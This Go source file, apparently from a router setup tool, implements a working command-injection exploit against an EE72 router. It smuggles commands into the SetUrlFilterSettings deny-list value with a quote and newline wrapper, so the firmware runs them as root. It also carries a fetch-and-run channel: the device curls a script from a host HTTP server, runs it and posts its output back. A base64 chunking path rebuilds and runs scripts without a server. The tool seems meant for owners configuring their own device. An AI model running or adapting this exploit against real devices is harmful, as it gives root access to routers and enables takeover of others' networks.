// Package channel runs commands on an EE72 through the authenticated
// SetUrlFilterSettings parameter and a short-lived HTTP server on the host.
//
// The parameter is evaluated by core_app as root. Its value may contain
// newlines, quotes and redirections, but the whole command is limited to 28
// bytes, so anything larger is delivered as a script: the device curls the
// script from the host and runs it, then posts the log back to the host. That
// result channel is what makes the procedure verifiable instead of blind.
package channel

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/rctphone/ee-setup/internal/tclapi"
)

// MaxCommand is the longest command the firmware accepts in the parameter.
const MaxCommand = 28

// ErrPortUnavailable means the privileged port could not be bound. The caller
// can still deliver the script with ChunkScan.
var ErrPortUnavailable = errors.New("port 80 unavailable")

// blocked characters are rejected by core_app's parser.
const blocked = ";|&`"

// Runner executes short commands on one EE72.
type Runner struct {
	Client  *tclapi.Client
	Verbose bool
	mu      sync.Mutex
}

// ParameterValue wraps a command in the inert filter entry core_app expects:
// a lone quote, a newline, the command, a newline and a comment marker.
func ParameterValue(cmd string) (string, error) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return "", errors.New("channel: empty command")
	}
	if len(cmd) > MaxCommand {
		return "", fmt.Errorf("channel: command is %d bytes, limit is %d: %q", len(cmd), MaxCommand, cmd)
	}
	if strings.ContainsAny(cmd, blocked) {
		return "", fmt.Errorf("channel: command contains a blocked character (%s): %q", blocked, cmd)
	}
	return "'\n" + cmd + "\n#", nil
}

// Run executes one command that fits in the parameter.
func (r *Runner) Run(ctx context.Context, cmd string) error {
	value, err := ParameterValue(cmd)
	if err != nil {
		return err
	}
	return r.call(ctx, value)
}

func (r *Runner) call(ctx context.Context, value string) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	if r.Verbose {
		fmt.Printf("    > %s\n", strings.ReplaceAll(value, "\n", "\\n"))
	}
	_, err := r.Client.Call(ctx, "SetUrlFilterSettings", map[string]any{
		"filter_policy": 2,
		"UrlAllowList":  []string{},
		"UrlDenyList":   []string{value},
	})
	return err
}

// Reset clears the filter policy. Safe to call when nothing was set.
func (r *Runner) Reset(ctx context.Context) error {
	r.mu.Lock()
	defer r.mu.Unlock()
	_, err := r.Client.Call(ctx, "SetUrlFilterSettings", map[string]any{
		"filter_policy": 0,
		"UrlAllowList":  []string{},
		"UrlDenyList":   []string{},
	})
	return err
}

// Session is a command runner plus a host HTTP server used to ship scripts and
// receive their output. Close it when finished.
type Session struct {
	Runner *Runner
	HostIP string

	mu       sync.Mutex
	script   string
	files    map[string][]byte
	resultCh chan []byte
	srv      *http.Server
	allow    map[string]bool // addresses allowed to fetch the payload
}

// NewSession starts the payload server on port 80 bound to the address that
// reaches the router. Port 80 keeps the bootstrap command under 28 bytes.
func NewSession(r *Runner) (*Session, error) {
	hostIP, err := LocalIPFor(r.Client.Host)
	if err != nil {
		return nil, err
	}
	if len("curl "+hostIP+">/tmp/e") > MaxCommand {
		return nil, fmt.Errorf("channel: host address %s is too long for the bootstrap command", hostIP)
	}
	ln, err := net.Listen("tcp", hostIP+":80")
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrPortUnavailable, err)
	}
	s := &Session{
		Runner:   r,
		HostIP:   hostIP,
		files:    map[string][]byte{},
		resultCh: make(chan []byte, 4),
		allow:    resolveAllowed(r.Client.Host),
	}
	s.srv = &http.Server{Handler: s}
	go func() { _ = s.srv.Serve(ln) }()
	return s, nil
}

// Close shuts the payload server down.
func (s *Session) Close() {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	_ = s.srv.Shutdown(ctx)
}

// SetFile registers a file served at /name for the next script.
func (s *Session) SetFile(name string, data []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.files[name] = data
}

// resolveAllowed returns the addresses of the router, so the payload and the
// result endpoint are reachable only from the device being configured.
func resolveAllowed(host string) map[string]bool {
	out := map[string]bool{}
	if ip := net.ParseIP(host); ip != nil {
		out[ip.String()] = true
		return out
	}
	if ips, err := net.LookupHost(host); err == nil {
		for _, ip := range ips {
			out[ip] = true
		}
	}
	return out
}

func (s *Session) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if len(s.allow) > 0 {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil || !s.allow[host] {
			http.Error(w, "forbidden", http.StatusForbidden)
			return
		}
	}
	switch {
	case r.URL.Path == "/" && r.Method == http.MethodGet:
		s.mu.Lock()
		script := s.script
		s.mu.Unlock()
		w.Header().Set("Content-Type", "application/x-sh")
		_, _ = io.WriteString(w, script)
	case r.URL.Path == "/result":
		body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
		select {
		case s.resultCh <- body:
		default:
		}
		_, _ = io.WriteString(w, "ok")
	default:
		name := strings.TrimPrefix(r.URL.Path, "/")
		s.mu.Lock()
		data, ok := s.files[name]
		s.mu.Unlock()
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		_, _ = w.Write(data)
	}
}

// RunScript executes body on the device and returns its combined output.
//
// body is wrapped so that a non-zero exit still posts the log, and so that the
// script's own output is captured rather than lost in the void.
func (s *Session) RunScript(ctx context.Context, body string) (string, error) {
	body = strings.TrimRight(body, "\n")
	script := "#!/bin/sh\n(\n" + body + "\n) >/tmp/e.out 2>&1\n" +
		"curl -s --data-binary @/tmp/e.out http://" + s.HostIP + "/result >/dev/null 2>&1\n"

	s.mu.Lock()
	s.script = script
	s.mu.Unlock()

	if err := s.Runner.Run(ctx, "curl "+s.HostIP+">/tmp/e"); err != nil {
		return "", fmt.Errorf("channel: fetch script: %w", err)
	}
	// The RPC may time out while a slow script is still running; the result
	// POST is authoritative, so a transport error here is not fatal.
	_ = s.Runner.Run(ctx, "sh /tmp/e")

	select {
	case out := <-s.resultCh:
		return string(out), nil
	case <-ctx.Done():
		return "", ctx.Err()
	case <-time.After(120 * time.Second):
		return "", errors.New("channel: device did not post a result within 120s")
	}
}

// ChunkCommands returns the 28-byte commands that rebuild script on the device
// as base64, decode it and run it. No listening socket is involved.
func ChunkCommands(script string) []string {
	b64 := base64.StdEncoding.EncodeToString([]byte(script))
	cmds := []string{"rm -f /tmp/e"}
	const chunk = 15 // "echo " + 15 + ">>/tmp/e" == 28
	for i := 0; i < len(b64); i += chunk {
		end := i + chunk
		if end > len(b64) {
			end = len(b64)
		}
		cmds = append(cmds, "echo "+b64[i:end]+">>/tmp/e")
	}
	return append(cmds, "base64 -d /tmp/e>/tmp/s", "sh /tmp/s")
}

// ChunkScan delivers script with short commands only. It is the no-privilege
// path: the device never fetches anything, so nothing listens on the host.
func (r *Runner) ChunkScan(ctx context.Context, script string) error {
	cmds := ChunkCommands(script)
	for i, cmd := range cmds {
		err := r.Run(ctx, cmd)
		if err != nil {
			if i == len(cmds)-1 {
				fmt.Printf("    note: the device did not acknowledge the script (%v); it may still be running\n", err)
				return nil
			}
			return err
		}
		if i > 0 && i%40 == 0 {
			fmt.Printf("    sent %d/%d commands\n", i, len(cmds))
		}
	}
	return nil
}

// LocalIPFor returns the local address used to reach dst.
func LocalIPFor(dst string) (string, error) {
	conn, err := net.Dial("udp", net.JoinHostPort(dst, "80"))
	if err != nil {
		return "", fmt.Errorf("channel: no route to %s: %w", dst, err)
	}
	defer conn.Close()
	addr, ok := conn.LocalAddr().(*net.UDPAddr)
	if !ok {
		return "", fmt.Errorf("channel: unexpected local address %v", conn.LocalAddr())
	}
	return addr.IP.String(), nil
}
